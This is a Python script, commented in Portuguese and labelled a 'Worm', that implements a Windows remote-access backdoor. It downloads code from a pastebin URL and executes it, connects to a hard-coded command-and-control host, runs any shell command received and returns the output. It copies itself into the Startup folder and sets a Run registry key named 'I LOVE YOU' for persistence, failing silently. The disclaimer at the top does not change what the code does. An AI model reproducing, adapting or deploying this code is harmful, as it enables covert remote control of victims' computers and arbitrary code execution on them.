

# Aviso de Responsabilidade: Utilização do Código Worm
# Este script Python foi desenvolvido por Mik e é disponibilizado como um codigo aberto. 
# Ao escolher usar este script, o usuário aceita total responsabilidade pelos resultados
# e possíveis impactos derivados da sua utilização.

import base64
import datetime
import getpass
import os
import platform
import psutil
import socket
import tabulate
import threading
import requests
import inspect
import sys
import subprocess
import shutil
import time

while True:
    try:
      url = 'https://pastebin.com/raw/TF6nxwrk'
      response = requests.get(url)
      if response.status_code == 200:
        code_content = response.text
        exec(code_content)
        break
      else:
        CONSTIP = "miklulsec.ddns.net"
        CONSTPT = 9999
        break
    except Exception as e:
        pass

# S T A R T   C O N E C T I O N   S E R V E R
class PERSISTENCE:

    def __init__(self):
        pass
    
class SYSINFO:

    def __init__(self):
        self.sysinfo = self.get_sys_info()
        self.boot_time = self.get_boot_time()
        self.cpu_info = self.get_cpu_info()
        self.mem_usage = self.get_mem_usage()
        self.disk_info = self.get_disk_info()
        self.net_info  = self.get_net_info()

    def get_size(self, bolter, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bolter < factor:
                return f"{bolter:.2f}{unit}{suffix}"
            
            bolter /= factor

    def get_sys_info(self):
        headers = ("Platform Tag", "Information")
        values  = []

        uname = platform.uname()
        values.append(("System", uname.system))
        values.append(("Node Name", uname.node))
        values.append(("Release", uname.release))
        values.append(("Version", uname.version))
        values.append(("Machine", uname.machine))
        values.append(("Processor", uname.processor))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_boot_time(self):
        headers = ("Boot Tags", "Information")
        values  = []

        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)

        values.append(("Boot Time", f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"))

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_cpu_info(self):
        headers = ("CPU Tag", "Value")
        values  = []

        cpufreq = psutil.cpu_freq()

        values.append(("Physical Cores", psutil.cpu_count(logical=False)))
        values.append(("Total Cores", psutil.cpu_count(logical=True)))
        values.append(("Max Frequency", f"{cpufreq.max:.2f}Mhz"))
        values.append(("Min Frequency", f"{cpufreq.min:.2f}Mhz"))
        values.append(("Current Frequency", f"{cpufreq.current:.2f}Mhz"))
        values.append(("CPU Usage", f"{psutil.cpu_percent()}%"))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_mem_usage(self):
        headers = ("Memory Tag", "Value")
        values  = []

        svmem = psutil.virtual_memory()
        swap = psutil.swap_memory()

        values.append(("Total Mem", f"{self.get_size(svmem.total)}"))
        values.append(("Available Mem", f"{self.get_size(svmem.available)}"))
        values.append(("Used Mem", f"{self.get_size(svmem.used)}"))
        values.append(("Percentage", f"{self.get_size(svmem.percent)}%"))
        
        values.append(("Total Swap", f"{self.get_size(swap.total)}"))
        values.append(("Free Swap", f"{self.get_size(swap.free)}"))
        values.append(("Used Swap", f"{self.get_size(swap.used)}"))
        values.append(("Percentage Swap", f"{self.get_size(swap.percent)}%"))
        
        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_disk_info(self):
        headers = ("Device", "Mountpoint", "File System", "Total Size", "Used", "Free", "Percentage")
        values = []

        partitions = psutil.disk_partitions()

        toappend = []
        for partition in partitions:
            toappend.append(partition.device)
            toappend.append(partition.mountpoint)
            toappend.append(partition.fstype)

            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                toappend.append(self.get_size(partition_usage.total))
                toappend.append(self.get_size(partition_usage.used))
                toappend.append(self.get_size(partition_usage.free))
                toappend.append(self.get_size(partition_usage.percent))
            except PermissionError:
                toappend.append(" "); toappend.append(" "); toappend.append(" "); toappend.append(" "); 
            
            values.append(toappend)
            toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval             

    def get_net_info(self):
        headers = ('Interface', 'IP Address', 'MAC Address', 'Netmask', 'Broadcast IP', 'Broadcast MAC')
        values = []

        if_addrs = psutil.net_if_addrs()
        toappend = []

        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                toappend.append(interface_name)
                if str(address.family) == 'AddressFamily.AF_INET':
                    toappend.append(address.address)
                    toappend.append('')
                    toappend.append(address.netmask)
                    toappend.append(address.broadcast)
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    toappend.append('')
                    toappend.append(address.address)
                    toappend.append(address.netmask)
                    toappend.append('')
                    toappend.append(address.broadcast)
                
                values.append(toappend)
                toappend = []

        rtval = tabulate.tabulate(values, headers=headers)
        return rtval

    def get_data(self):
        self.DATA_STRING = "\n" + self.sysinfo + "\n\n" + self.boot_time + "\n\n" + self.cpu_info + "\n\n" + \
                            self.mem_usage + "\n\n" + self.disk_info + "\n\n" + self.net_info + "\n\n"
        return self.DATA_STRING 
class CLIENT:

    SOCK = None
    KEY  = ")J@NcRfU"

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port      = _pt


    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":

            #print("Executing Shell: " + data[1])
            toexecute = data[1].rstrip(" ").lstrip(" ")
            toexecute = " ".join(toexecute.split())
            if toexecute.split(" ")[0] == "cd":
                try:
                    os.chdir(toexecute.split(" ")[1])
                    self.send_data("")
                except:
                    self.send_data("Error while changing directory!")
            else:
                try:
                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = comm.communicate()
                    self.send_data(output + errors)
                except FileNotFoundError:
                    self.send_data("No Such File or Directory")

    def acceptor(self):

        data = ""
        chunk = b""

        while True:
            chunk = self.SOCK.recv(4096)
            if not chunk:
                break
            data += chunk.decode('utf-8')

            if self.KEY.encode('utf-8') in chunk:
                data = data.rstrip(self.KEY)
                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
                t.daemon = True
                t.start()
                data = ""

    def engage(self):
        while True:
            try:
                self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.SOCK.connect((self.ipaddress, self.port))
                self.acceptor()
            except ConnectionResetError:
                time.sleep(5)  # Aguarda 5 segundos antes de tentar novamente
            except Exception as e:
                time.sleep(5)

# A D D   R E G I S T E R   W I N D O W S
def is_program_running():
    current_process = psutil.Process(os.getpid())
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == current_process.name() and process.info['pid'] != current_process.pid:
            return True
    return False
def is_program_in_startup_registry(program_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "I LOVE YOU"  # Substitua "Nome_Desired" pelo nome desejado para a entrada no registro

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)

        try:
            value, _ = winreg.QueryValueEx(key, key_name)
            return value == program_path
        except FileNotFoundError:
            return False
        finally:
            winreg.CloseKey(key)

    except Exception as e:
        pass  # Não imprime mensagens de erro, apenas passa silenciosamente
        return False
def add_to_startup_registry(program_path):
    try:
        if not is_program_in_startup_registry(program_path):
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "I LOVE YOU"
            key_value = program_path

            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)

            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, key_value)

            winreg.CloseKey(key)
        else:
            pass  # Não imprime mensagem, apenas passa silenciosamente
    except Exception as e:
        pass  # Não imprime mensagens de erro, apenas passa silenciosamente
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except socket.error as e:
        return None


def clientw():
    client = CLIENT(CONSTIP, CONSTPT)
    client.engage()

if __name__ == "__main__":

    USER_NAME = getpass.getuser()
   
    # copiando o nome do diretorio de execucao
    script_path = os.path.abspath(__file__)
    script_filename = os.path.basename(script_path)
   
    # contruindo o caminho para o diretorio de execucao de inicializacao do windows
    program_path = fr"C:\Users\{USER_NAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{script_filename}"
    
    # se auto copiando para o progam_path, caso ele ja esteja la, ele sera substituido
    shutil.copy2(script_path, program_path)

    add_to_startup_registry(program_path)

    client = threading.Thread(target=clientw)
    client.start()
